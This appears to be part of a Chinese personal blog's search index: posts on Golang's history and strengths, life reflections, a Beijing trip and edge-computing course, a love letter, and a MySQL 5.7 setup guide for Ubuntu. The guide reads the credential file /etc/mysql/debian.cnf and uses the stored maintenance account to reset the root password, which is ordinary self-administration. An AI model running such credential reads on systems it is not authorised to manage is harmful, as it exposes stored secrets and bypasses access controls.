    <url>/2018/08/19/Golang%20%E7%AC%94%E8%AE%B0-%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>　　Go 是一种非常高效的，支持并发 、垃圾回收的编译型开源系统编程语言，它能让构造简单、可靠且高效的软件变得容易。</p>
<a id="more"></a>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/8/19-1.jpg" alt="19-1"></p>
<p>　　Golang 以前的 logo 是可爱的囊地鼠，生性懒散 ，Go 特性之一是惰性求值（Lazy Evaluation），即延迟执行代码。 但是，Golang 在 2018 年更换了如下的新 logo，全新形象代表速度和效率：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/8/19-2.jpg" alt="19-2"></p>
<h4 id="Golang-的历史"><a href="#Golang-的历史" class="headerlink" title="Golang 的历史"></a>Golang 的历史</h4><p>　　C/C++ 的发展速度无法跟上计算机发展的脚步，十多年来也没有出现一门与时代相符的主流系统编程语言，因此人们需要一门新的系统编程语言来弥补这个空缺。在 Go 语言出现之前，开发者们总是面临非常艰难的抉择，究竟是使用执行速度快但是编译速度并不理想的语言（如：C++），还是使用编译速度较快但执行效率不佳的语言（如：.NET、Java），或者说开发难度较低但执行速度一般的动态语言呢？显然，Go 语言在这 3 个条件之间做到了最佳的平衡：快速编译，高效执行，易于开发。</p>
<p>　　Golang 出生名门 Google，介绍一下 Golang 的设计者：</p>
<ul>
<li><strong>Robert Griesemer</strong>，参与开发 Java HotSpot 虚拟机；</li>
<li><strong>Rob Pike</strong>，Go 语言项目总负责人，贝尔实验室 Unix 团队成员，参与的项目包括 Plan 9，Inferno 操作系统和 Limbo 编程语言；</li>
<li><strong>Ken Thompson</strong>，贝尔实验室 Unix 团队成员，C 语言、Unix 和 Plan 9 的创始人之一，与 Rob Pike 共同开发了 UTF-8 字符集规范。 </li>
</ul>
<p>　　2007 年，受够了 C++ 煎熬的 Google 首席软件工程师 Rob Pike 纠集 Robert Griesemer 和 Ken Thompson 两位牛人，决定创造一种新语言来取代 C++，这就是 Golang。出现在 21 世纪的 GO 语言，虽然不能如愿对C++取而代之，但是其近 C 的执行性能和近解析型语言的开发效率以及近乎于完美的编译速度，已经风靡全球。</p>
<p>　　在 2009 年 10 月 30 日，Rob Pike 以 Google Techtalk 的形式第一次向人们宣告了 Go 语言的存在。直到 2009 年 11 月 10 日，开发团队将 Go 语言项目以 BSD-style 授权（完全开源）正式公布了 Linux 和 Mac OS X 平台上的版本。</p>
<h4 id="Golang-的优点"><a href="#Golang-的优点" class="headerlink" title="Golang 的优点"></a>Golang 的优点</h4><ul>
<li><strong>天生支持高并发</strong>。Goroutines 是 Go 面向线程的轻量级方法，而 channel 是 goroutines 之间通信的优先方式。Goroutine 和 channel 使得编写高并发的服务端软件变得相当容易，很多情况下完全不需要考虑锁机制以及由此带来的各种问题。单个 Go 应用也能有效的利用多个 CPU 核，并行执行的性能好。</li>
<li><strong>编译速度快</strong>。编译时间用秒计算，相较于 Java 和 C++呆滞的编译速度，Go 的快速编译时间是一个主要的效率优势。 </li>
<li><strong>部署简单</strong>。Go 编译生成的是一个静态可执行文件，除了 glibc 外没有其他外部依赖。这让部署变得异常方便：目标机器上只需要一个基础的系统和必要的管理、监控工具，完全不需要操心应用所需的各种包、库的依赖关系，大大减轻了维护的负担。</li>
<li><strong>开发效率</strong>。 GO语言使用起来简单、代码描述效率高、编码规范统一、上手快。通过少量的代码，即可实现框架的标准化，并以统一的规范快速构建API业务逻辑。能快速的构建各种通用组件和公共类库，进一步提升开发效率，实现特定场景下的功能量产。</li>
<li><strong>执行性能好</strong>。Go 极其快，其性能与 Java 或 C++相似，Go 一般比 Python 要快 30 倍。 </li>
<li><strong>高效的垃圾回收机制</strong>。Go 拥有简单却高效的标记-清除回收器。它的主要思想来源于 IBM 的可复用垃圾回收器，旨在打造一个高效、低延迟的并发回收器。当然，使用一门具有垃圾回收功能的编程语言不代表你可以避免内存分配所带来的问题，分配和回收内容都是消耗 CPU 资源的一种行为。 </li>
<li>……</li>
</ul>
<h4 id="Golang-的适用场景"><a href="#Golang-的适用场景" class="headerlink" title="Golang 的适用场景"></a>Golang 的适用场景</h4><ul>
<li>服务器编程，以前你如果使用 C 或者 C++ 做的那些事情，用 Go 来做很合适，例如处理日志、数据打包、虚拟机处理、文件系统等。</li>
<li>分布式系统，数据库代理器等。</li>
<li>网络编程，包括 Web 应用、API 应用、微服务等。</li>
<li>云平台，目前国外很多云平台在采用 Go 开发。</li>
<li>……</li>
</ul>
<h4 id="Golang的应用案例"><a href="#Golang的应用案例" class="headerlink" title="Golang的应用案例"></a>Golang的应用案例</h4><ul>
<li><strong>Docker</strong>，基于 Go 语言的开源应用容器引擎。</li>
<li><strong>kubernetes</strong>，Google 团队发起并维护的基于 Docker 的开源容器集群管理系统，它不仅支持常见的云平台，而且支持内部数据中心。 </li>
<li><strong>Docker Swarm</strong>，Docker 官方提供的一款集群管理工具，其主要作用是把若干台 Docker 主机抽象为一个整体，并且通过一个入口统一管理这些 Docker 主机上的各种 Docker 资源。 </li>
<li><strong>Youtube</strong>，全球最大视频网站</li>
<li><strong>七牛云存储</strong>，国内领先的企业级公有云服务商，致力于打造以数据为核心的场景化 PaaS 服务。 </li>
<li>……</li>
</ul>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>开始懂了</title>
    <url>/2018/08/19/%E5%BC%80%E5%A7%8B%E6%87%82%E4%BA%86/</url>
    <content><![CDATA[<p>　　因为我没有期望，所以我也不再失望了。</p>
<a id="more"></a>
<p>　　近来的一点点生活感悟：</p>
<ul>
<li>后来才明白，这么多年，妄图改变别人，做了那么多费力不讨好的事情，最后伤害的都是自己。人和人终究是不一样的，或许做好自己才是这个年纪最应该做的事吧。</li>
</ul>
<ul>
<li>听了再多的故事，学了再多的道理，也不及经历过一些事情来得实在。只有那些刻骨铭心的经历才能让自己的内心真正强大，所以能够有所经历、有所感悟，也是弥足珍贵的。</li>
</ul>
<ul>
<li>一次次见证没有计划带来的致命后果，也深知一次次的没有计划最终足够摧毁一个人，但还是很难去改变一些已经根深蒂固的东西。我想，合理的计划，谨慎地执行，及时的调整，离成功也就不远了。</li>
</ul>
<ul>
<li>最廉价的爱情，无非是迷失了自我，一味的妥协与讨好。其实，无论是友情亲情爱情，真正好的关系是不必讨好的。我们最爱的始终还应该是自己，至于最后能不能走下去，真的，看缘分。</li>
</ul>
<ul>
<li>要做到察言观色确实会很累，但是，时刻只顾及自己，又会显得十分天真，就像小孩一样。有时候会想，活着本来就很累了，要做那么多自己并不喜欢的选择，何必再去考虑别人的感受。当然，你也可以选择最舒服的方式活着，但是，不要忘了，你的世界不可能始终一个人。一个真正成熟的人不会轻易不顾别人的感受做一些事情。</li>
</ul>
<ul>
<li>能够互相见证成长应该是一件很棒的事情了吧。当我们经历人生的起起伏伏，彼此的祝福与鼓励都会让我们对未来充满希望。有时候觉得，这样的感情好纯粹，互相之间无比信任，无需计较太多，也不会害怕失去。感谢生命有你参与，愿你我情谊常存。</li>
</ul>
<ul>
<li>因为我没有期望，所以我也不再失望了。真正希望你进步的人才会对你有所期望，而失望并不可怕，可怕的是不再对你有所期望。所以，要合理看待失望，而不是害怕失望。我想，及时反思，尽力付出，才是让自己进步的方法。</li>
</ul>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>北京，再会</title>
    <url>/2018/08/08/%E5%8C%97%E4%BA%AC%EF%BC%8C%E5%86%8D%E4%BC%9A/</url>
    <content><![CDATA[<p>　　2015年由于参加比赛匆匆到过北京，今年7月中旬再次来到北京。三年多过去，再次来到北京，不出所料，还是有很多不一样的感受。毕竟，在这三年里，北京又经历了快速的发展，而自己也经历过很多的事情，也增长了很多的见识。曾经的井底之蛙，面对帝都的一切都充满了敬意，现如今已不再像第一次那样懵懂，更多的是面对这些不一样所引发的深层思考。</p>
<a id="more"></a>
<h4 id="学学想想"><a href="#学学想想" class="headerlink" title="学学想想"></a>学学想想</h4><p>　　很荣幸能够参加这次在中科院计算所举办的龙星计划边缘计算课程。关于边缘计算这个领域，自己也是在今年年初才开始了解的，研读了一些基本的论文以及施老师出版的教材，然后在今年5月份我们实验室有幸邀请到施老师来给大家做学术报告，后续也针对边缘计算进行了系统调研。这次课程让我们进一步系统地了解了边缘计算的相关知识，也认识了国内在这个领域做研究的朋友们。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/8/8-1.jpg" alt="8-1"></p>
<h5 id="边缘计算"><a href="#边缘计算" class="headerlink" title="边缘计算"></a>边缘计算</h5><p>　　先说说边缘计算的定义以及它的优势，边缘计算（edge computing）作为一种新的计算模式，使数据在源头附近就能得到及时有效的处理，满足实时性、降低带宽和隐私保护等需求。与传统的云计算模式相比，边缘计算模式不单在靠近数据中心的节点上进行处理，而且还能绕过网络带宽与延迟的瓶颈，在数据传输过程中的每一个节点上执行数据处理。随着物联网和大数据时代的到来，这种带宽和延迟的优化显得尤其重要。因此，边缘计算不仅得到了学术界的广泛认可，相关的论文层出不穷，还获得了产业界的青睐，华为、阿里、百度、腾讯等大公司都对边缘计算十分感兴趣。在这五天的课程里，施老师给我们讲的第一课就是如何成为一个科学家，从一个成功的科学家的心路历程开始讲起，到方法论，再到对我们的美好祝愿。最让我觉得认同的是他对于科研的一些理解，科研不仅仅是为了论文，而应该是解决实际问题的副产品，不应该像某些只注重论文成果的科研人员，纯粹变成论文机器。同时，施老师也为我们精心准备了边缘计算的课程内容，从边缘计算的愿景、应用场景、挑战、现有的系统以及安全与隐私保护五个方面进行了详细的讲解。此外，他还邀请了寒武纪、中移物联网、百度的三位嘉宾与我们分享他们在边缘计算方面的一些工作与思考。</p>
<h5 id="寒武纪"><a href="#寒武纪" class="headerlink" title="寒武纪"></a>寒武纪</h5><p>　　对于寒武纪，我以前并不太了解，其实，它是一家做智能芯片的公司，世界首款商用深度学习专用处理器。它被誉为“全球首款AI芯片”华为麒麟970的幕后功臣“。因为寒武纪的产品已经被集成到华为的麒麟芯片中，并且运用到华为P20等实际的产品中，使得语音识别、人脸识别等机器学习技术在移动终端上得到更好的应用。去年，成立一年多的寒武纪完成1亿美元A轮融资，阿里、联想等巨头等都有投资，可以说外界对其十分看好。</p>
<p>　　给我们做报告的是寒武纪的陈云霁研究员，他和弟弟陈天石都是中科院计算所的研究员，都来自中科大少年班，充满着传奇色彩。陈云霁研究员的研究方向是芯片，而弟弟陈天石主要是做人工智能，兄弟俩当年思考未来科技发展的方向时，很自然地就决定结合起来做人工智能芯片。他们就是我佩服的研究人员，从实际出发，为了国家的科技进步，不仅发表了很多顶级会议的论文，并且引起了国际学术界的关注。同时，从科研到再到创办实际的公司，想必他们也付出了很多。由于陈研究员很忙，短短20分钟的报告，大致向我们介绍了他们的一些工作，以及他们对于人工智能芯片对边缘计算的意义。边缘计算在一定程度上就是解决机器学习算法在云端运行存在的问题，因为每次都需要将数据传送到云端，以图像识别为例，如果每次都上传到云端，会带来巨大的带宽消耗。有了机器学习芯片的支持，就可以更好的在终端运行机器学习算法，实现云端训练模型，然后在终端运行的目标。</p>
<h5 id="中移物联网和百度"><a href="#中移物联网和百度" class="headerlink" title="中移物联网和百度"></a>中移物联网和百度</h5><p>　　中移物联网是我本科期间就接触过的公司，使用过他们的OneNET物联网云平，也申请过他们的麒麟座开发板（虽然并没有好好地使用过，惭愧啊！），对于他们公司的产品也还算比较了解。中移物联网数字化产品部的吴经理在给我们的远程报告中介绍了他们公司的一些产品，主要集中在智能家居和车联网场景，以及他们认为的边缘计算的可能需求，主要介绍了智能家居、车联网和智能网关三个案例中采用边缘计算的设想。后来，百度的吴经理也给我们介绍了百度边缘计算的思考，他提到AI走向边缘计算的必然性，需要应对AI应有的时延要求、应对网络阻塞问题、分布式计算能力的获取，数据安全与隐私。大家都知道百度一直号称是AI公司，一直主推All in AI，但是AI训练和AI推理具有不同的特点和要求，AI训练需要庞大算力和数据 ，那么集中就成为必然，而AI推理涉及用户体验，需要快速响应，即推理服务请求应该随时服务，不应该也不能等待。这就使得云计算与边缘计算结合成为可能，这也可以在一定程度上促进AI的发展。核心云计算进行AI训练，边缘计算进行AI推理，这 将成为AI发展的一个方向。由于这两家公司与我们的研究十分相关，所以后续我们还会与他们有详细的交流，有机会再写博客分享。</p>
<h5 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h5><p>　　这次到北京的主要目的是学习交流，由于时间有限，虽然没有学到太多的干货，但是这次的课程也确实让我增长了见识，扩宽了自己的科研视野，也使我对边缘计算领域有了更深入更全面的认识。在中科院，见识了什么是真正的科研。感慨在学校里，部分老师只为了发论文评职称评，很多东西都很虚。可惜的是，当前的制度就是论文和成果为王，这其实也很影响真正做科研的人。所以，我现在也依然很迷茫，不知道未来的路在哪里。仔细思考当前研究界和产业界对边缘计算这个领域的关注度，按照边缘计算目前火热的趋势，我觉得还是有很多的机会，如果潜心做下去，一定大有可为。</p>
<h4 id="走走看看"><a href="#走走看看" class="headerlink" title="走走看看"></a>走走看看</h4><p>　　再次去到天安门，相比第一次来时的激动与敬仰之情，这一次，内心略显平淡。但是，走在人来人往的长安街，依然还是感到骄傲！作为一名共产党员，我本来想去看天安门广场看一次升国旗仪式，但是听了朋友讲述的经历，突然觉得没有太大必要了。为了看升旗，很早就要去排队，晚上基本不能睡觉，这样的事我应该是不会做的。不过，说不定，以后会有特别想去看的时候。第一次去北京的时候并没有去故宫。今年年初，经朋友推荐，看了故宫博物院单霁翔院长的演讲，哇，一位隐藏的段子手，瞬间被圈粉了。所以，这次去北京就早早地计划要去故宫看看。大殿内的金碧辉煌，仿佛在诉说着明清王朝的昔日盛世。昔日的皇家圣地，也成了今日的旅游胜地，仿佛在诉说着明清王朝的衰败。 回忆起看过的《明朝那些事儿》，感慨朱棣迁都北京的壮举，留下了这么壮观的紫禁城。登景山公园，俯瞰故宫紫禁城全景。遥望这大大小小的宫殿，感觉确实非同一般。站在景山公园最高建筑“万春亭”，登高远眺，故宫全景尽收眼底。不论从哪个角度看，故宫规模宏大、辉煌大气，给人以强烈的视觉震撼！</p>
<p>　　在国家博物馆，感受博大精深的中华文化。由于对古代中国的历史并不是特别清楚，对于青铜器等历史文物等也不是很感兴趣，所以印象比较深刻的是《复兴之路》基本陈列。复兴之路基本陈列总共分为五个大部分，第一部分，中国沦为半殖民地半封建社会；第二部分，探索救亡图存的道路；第三部分，中国共产党肩负起民族独立、人民解放的历史重任；第四部分，建设社会主义新中国；第五部分，走中国特色社会主义道路。它展示了我们中华民族从鸦片战争以来一百多年团结奋斗、自强不息的历史，展现了中华民族不屈不挠英勇抗争、在中国共产党领导下寻路奋斗求解放、艰辛探索搞建设、改革开放谋发展走中国特色社会主义强国之路的壮丽史诗和宏篇巨著。</p>
<p>　　回顾这段复兴之路，多少英雄为此付出了生命，多少伟大的人为国家的发展。但是，再看看现如今中国式悲哀频频上演，明星家事天下知，英雄事迹鲜有闻。泛娱乐化的时代，明星的八卦被炒得沸沸扬扬，而为国家发展默默奉献的科学家、军人、工人等等却很少得到该有的关注和尊重。我们今天安定富足的生活来之不易，没有革命军人的流血牺牲哪来的和平？没有科学家孜孜不倦的科研和发明哪来的高科技？没有农民和工人的辛勤劳作哪来的丰衣足食和住行舒适？不否认，明星给我们的业余生活增添了乐趣，但社会的发展不是他们演两部戏唱两首歌就能进步的。虽然我们无法左右周围人的价值观，也无法改变这个社会，但我们可以传递正能量。回顾中华民族的屈辱历史，再感受今天中国的伟大成就，以及展望可以预见的美好未来。我们应该牢记历史，不忘初心，怀揣梦想，并为之努力奋斗，这个国家才能越来越好。</p>
<h4 id="见见聊聊"><a href="#见见聊聊" class="headerlink" title="见见聊聊"></a>见见聊聊</h4><p>　　在开课前两天到达北京，去见了老友，他们一起陪我玩了两天。一起去故宫，去国博，去天安门，一起看电影，一起撸串，一起在中传的操场畅谈人生。很幸运，能有这样一群朋友陪着我在帝都吃吃喝喝、聊聊逛逛。毕业后，不同的人选择了不同的方向，一年以后，我发现大家关心的话题开始有了变化。工作的开始担心房子、房贷的问题，读研的开始准备找工作，或者说继续深造。各有各的烦恼，各有各的开心，北漂的艰难，不一样的生活节奏，在帝都成长的喜悦，所接触的人事物，都让我觉得有些遥不可及。另外，工作的羡慕读书的时间自由，读书的羡慕工作的财富自由。很多时候，我们就在这样的羡慕中做着各自的努力，直到有一天，我们的生活慢慢有更多的共同话题，于是我们也都长大了。</p>
<p>　　在北京的这周里，去了好几所学校，清华、北大、北航、北邮，对于帝都的学校，一直有一种敬畏感。但是，与朋友、学长学姐交流才发现，当你真正了解以后，也没有那么的神圣。这些学校确实有很多很多厉害之处，也有很多超厉害的人物，但是与我们也有很多相似之处，没有那么遥不可及。在北邮，见了很想见的学长学姐，交流甚欢。曾经不要我的北邮，听他们说来也没有想象中的那么好。虽然很遗憾，没能到帝都去读研，但是现在想来曾经给我建议的恩师让我选择了现在的学校也是没错的，至少现在也还蛮知足。在北航，见了曾经的初中老友，多年没见的我们，再次见面依然无话不聊。吐槽研究生生活，回忆初中快乐时光。在清华北大，感受不一样的氛围，恬静幽雅的校园环境，古建筑那种古朴的气息浓郁而悠远，顶尖高校特有的书香气息扑面而来。在清华园，逛到水木清华，想起才子李健，这种说不出来的崇敬油然而生。在北大未名湖畔，寻觅季羡林笔下的未名湖，在浓郁的中国风建筑里感受中国传统文化。一所大学的灵魂在于它的文化，没有文化的大学几乎没有未来，也不会培养出太多的人才，当然，清北都是有灵魂的。</p>
<p>　　闲聊时，经常和老友吐槽在北京的种种较差的体验，赶上北京难得一遇的大暴雨，空气太过潮湿，实在是不太适应这样的气候。虽然个人对于北京没有那么向往，也并不是我所理想的城市，但是，对于中国的政治、经济、文化中心，内心还是十分崇敬的。我也多次提及对帝都丰富资源的羡慕，超多的高校、听不完的讲座以及数不胜数的初创公司等等，这些对于年轻人来说这是很不错的。更多的资源意味着更多的机会，更多的可能，这也是为什么会那么多北漂的人。</p>
<p>　　匆匆到来，又匆匆离去。见证了帝都的深厚的历史文化底蕴，感受了繁华都市里充满生机与活力的氛围，也了解了北漂一族的不易。祝在这里的你们都好，愿你们在异常艰难的北漂生活中能够被温柔以待。我果然又不负众望地将这篇博客成功拖了将近一个月，不过已经写了很多了。当然，我也还有很多想要分享的，如果你有酒的话，下次当面讲故事给你听。总之，再次到访北京，果然不虚此行。北京，再会！</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>有你的样子，真好</title>
    <url>/2018/07/13/%E6%9C%89%E4%BD%A0%E7%9A%84%E6%A0%B7%E5%AD%90%EF%BC%8C%E7%9C%9F%E5%A5%BD/</url>
    <content><![CDATA[<p>　　你在我身边像个小孩，单纯而善良。今后我所有的牵挂，所有的向往，都和你一样。让我们，平静渡过漫长。</p>
<a id="more"></a>
<p>我的女神，</p>
<p>　　我们的第1个100天，要说感想也还是蛮多的。这段时间，经历过开心与惊喜，也有伤心和难过，或许这就是爱情本来该有的样子。我有我的小脾气，你有你的小倔强，几乎每周我们都要讨论是不是真的爱我，也是慢慢的，我才选择去相信。有时候，我确实有些感性，一开始我就想把你紧紧抱着，就像你现在也会自私的想要让我始终就是你一个人的。这样的想法我很早就有了，所以才会因为一些事情生气。</p>
<p>　　我的认真主动，你的后知后觉，有时候让我觉得很害怕会失去。还好，现在终于有了把你紧紧抱住的感觉。暑假的短暂离别，从一开始的不适应，到后来的理解。其实，这段时间也算是是对我们的考验，可以让我们更好的去思考应该如何相处。特别是最近在看刘若英的《我敢在你怀里孤独》，我突然就对你这样性格的人有了更深刻的认识，对于如何处理独处与相处也有了新的体会。其实，了解一个人本来就是很有意思的事情，更何况是了解自己喜欢的人呢。经过这100天的了解，我也是慢慢能够理解你的一些行为，希望你也可以试着去理解我。</p>
<p>　　我们原本就是很不一样的人，我很有条理，你却很随性。但是我很喜欢这样的不一样，就像你曾经和我说，如果我找一个和我一模一样的人，那该有多无聊。确实，我们就是有太多的不一样才会有这样有意思的100天。每次翻开聊天记录，满满的都是恋爱的味道。不过，在一起的这些日子，你确实改变了我很多，无论是一些生活习惯，还是对爱情的认识。或许真的是觉得找到了对的人，我才会这样愿意去等待，去为你而改变吧。</p>
<p>　　你总说你想要最舒服的生活方式，不想有太多的束缚，不想太累，我当然也希望你可以一直这样，我也会尽量让你这样。但是，还是希望你自己能很好地去处理一些事情。我也想我可以为你做好所有的事情，我也希望我会是可以随时保护你的人，但是有些事情还是会需要你自己去做。所以，有时候还是会很担心你，毕竟有些路我已经走过，还是希望你能够意识到其中的不易，以便早做准备。总之，希望你变得更好。</p>
<p>　　你说，我的宽容，我的耐心，我的尊重让你很容易就为我沦陷，这应该是这100天里，我听过最开心的话，哈哈。你说我在爱情方面像个小孩，而我却觉得你在我身边，很多时候都像小孩，单纯而善良。其实，你的善良和天真也是我一直想要守护的东西，所以我才会对你宽容、有耐心以及尊重。虽然我依然常常扮演着学长的角色，经常教育你，甚至有时候也会因为你不听而生气。后来，甚至会有无能为力的感觉。我确实很希望能够改变你，但是你不喜欢刻意去改变，后来，我也慢慢意识到这样的改变确实会很累。所以，我也希望我们能够继续守护彼此那些不一样的东西。</p>
<p>　　莫文蔚的那首《慢慢喜欢你》很好地诠释了我们在一起的过程中你给我的感觉。你真的是一个慢热的人，就像歌词写的，慢慢喜欢你，慢慢的亲密，慢慢聊自己，慢慢和你走在一起……我们就像是这样，从你一开始所说的不习惯，到现在慢慢依赖我，爱我。我都不曾想过我们会像现在这样好，但是，我现在确实感觉很幸福，我们互相拥有，互相珍惜。</p>
<p>　　谢谢你选择与我相伴，信任我，给与我不曾有的感觉，让我有足够的力量更好地往前走。希望我们能够继续过好我们以后很多的100天，希望我们可以一起互相陪伴，度过人生的潮起潮落。我会学习成为一个好男友，希望带给你更多的幸福，给你留下很多感动的回忆。</p>
<p>　　没想到可以写这么多（公开的博客，也就没有放女神的照片啦，见谅！），又一个为我们熬的夜，很开心，哈哈。我已经想象过无数次我们以后的样子，经常想着想着就会笑。嗯，有你的样子，真好！不想谈太久太久以后的事情，我觉得，如果以后都能好好的走下去的话，我相信，很多事情也就都会是顺其自然的。</p>
<p>爱你的男神。</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=572846219&auto=1&height=66"></iframe>

]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>停更半年，再次回归</title>
    <url>/2018/07/12/%E5%81%9C%E6%9B%B4%E5%8D%8A%E5%B9%B4%EF%BC%8C%E5%86%8D%E6%AC%A1%E5%9B%9E%E5%BD%92/</url>
    <content><![CDATA[<p>　　有所计划，顺其自然。</p>
<a id="more"></a>
<p>　　自2018年初博客停止更新，至今已有将近半年的时间，最近一直在思考，自己曾坚持几年的东西竟然丢下这么久了，想想还有些后怕。最近突然意识到这半年自己有点迷失，希望能够慢慢找回自己。时隔将近半年，重新开始写博客，确实感到有些生疏，不过，这种感觉还是那么熟悉。</p>
<p>　　先说说这半年我为什么没有坚持继续写博客吧。主要有以下几个方面的原因，一是，自己目前正处于研究生期间，每天有固定的工作（学习）时间，留给自己的时间并不多，并且由于所研究的内容涉及到一些课题组的利益，所以不太方便写成博客进行发表；二是，自己也在思考，步入研究所阶段，写的博客是不是应该更加有深度，而不再把它当作笔记本，因此，自己也在忙着充电，读一些有意义的书，学习新的技术等。三是，忙于自己人生的大事的一部分，谈恋爱。找到一个互相喜欢的人也还是蛮开心的，所以也确实花了不少时间来共度美好的时光。最近也在思考，两个人在一起应该互相支持，共同进步，而不仅仅只是玩耍。</p>
<p>　　然后，说说对于这个博客我自己的一些思考与计划。前面提到，希望写出更有深度的内容，因此，一方面，我打算介绍一些更新的技术。很老的技术我就不再打算写了，主要侧重于自己实践过的知识或者是技术，根据自己的体会做一些推荐和建议。另一方面，我会多写一些自己对生活的一些感悟，包括观后感、读后感或者是突然的感悟等等。毕竟是私人博客，所以所写的内容肯定会有一些个人的偏见，当然，我会尽可能客观的表达自己的看法。如果有不同的观点和看法，还希望看我博客的朋友能够多多包涵，也可以私下交流。</p>
<p>　　最后，感谢关注过我博客的所有人。从 CSDN 博客平台到 Wordpress 自建博客，再到现在的 Github Pages，累计浏览人数已经超过 20 万。虽然现在的 Github Pages 没有 CSDN 那么大的流量，但是还是更喜欢现在的方式。因为，相比于 CSDN，私人博客不仅仅可以写技术，也可以谈谈生活。在这个过程中，我其实也收获了很多，认识了很多素昧平生的人，与他们交流我也学到了很多新的知识。即使 CSDN 的博客已经很久没有更新了，还是有人给我发邮件请教问题或者是表达感谢，这些小事给我带来的成就感是源源不断的 。我想，我还是会尽力写下去，也希望得到更多人的认可与支持。谢谢你们！</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 16.04 中 Mysql 5.7 安装配置</title>
    <url>/2018/01/26/Ubuntu%2016.04%20%E4%B8%AD%20Mysql%205.7%20%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>　　记录在 Ubuntu 16.04 安装 Mysql 5.7 时遇到的一些问题。</p>
<a id="more"></a>
<h5 id="Mysql安装"><a href="#Mysql安装" class="headerlink" title="Mysql安装"></a>Mysql安装</h5><p>　　使用如下命令进行安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install mysql-server mysql-client</span></div></pre></td></tr></table></figure>
<p>　　检查安装是否成功以及 Mysql 是否运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo netstat -tap | grep mysql</span></div></pre></td></tr></table></figure>
<p>　　启动/关闭/重启 Mysql：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo service mysql start    <span class="comment"># 启动</span></span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo service mysql stop	<span class="comment"># 关闭</span></span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo service mysql restart  <span class="comment"># 重启</span></span></div></pre></td></tr></table></figure>
<p>　　通过以上步骤基本已经完成安装，但是我们也应该注意到，安装过程中都没有要求填写用户名和密码。终端输入 <code>mysql -u root -p</code> 之后，要求输入密码，但是我们并没有设置密码，随便输入之后，提示如下错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES)</div></pre></td></tr></table></figure>
<p>　　查找资料发现 5.7 版本与之前的版本不太一致，需要一些特殊的操作，具体请看下一节。</p>
<h5 id="Mysql-5-7-root无法登录的问题"><a href="#Mysql-5-7-root无法登录的问题" class="headerlink" title="Mysql 5.7 root无法登录的问题"></a>Mysql 5.7 root无法登录的问题</h5><p>　　在这个文件里面有着 Mysql 默认的用户名和用户密码，用户名默认的不是 root，而是 debian-sys-maint，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> cat /etc/mysql/debian.cnf</span></div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/26-1.png" alt="26-1"></p>
<p>　　使用该账号进行登录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> mysql -u debian-sys-maint -p</span></div></pre></td></tr></table></figure>
<p>　　查询已有的数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt; show databases;</div></pre></td></tr></table></figure>
<p>　　操作 Mysql 数据库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt; use mysql</div></pre></td></tr></table></figure>
<p>　　查看 Mysql 数据库中有哪些表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt; show tables;</div></pre></td></tr></table></figure>
<p>　　可以看到有一个 user 表，我们查询 user 表中的用户和密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt; select user,authentication_string from user</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/26-2.png" alt="26-2"></p>
<p>　　注意：这里不能查询 password 字段（如下命令），因为在新版本中 password 字段已经被 authentication_string 字段替换。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt; select user,password from user</div></pre></td></tr></table></figure>
<p>　　更新 user 表中 root 用户的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt; update user set authentication_string=password(&apos;新密码&apos;) where user=&apos;root&apos;;</div></pre></td></tr></table></figure>
<p>　　重新加载权限表，一定要进行这一步，否则更新不会生效：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt; flush privileges</div></pre></td></tr></table></figure>
<p>　　最后，即可使用 root 用户以及我们设置的密码进行登录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt; mysql -u root -p</div></pre></td></tr></table></figure>
<p>　　注意：由于用户 debian-sys-maint 的信息可以从文件中查找到，因此最好将其密码也改一下。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Django 学习笔记</title>
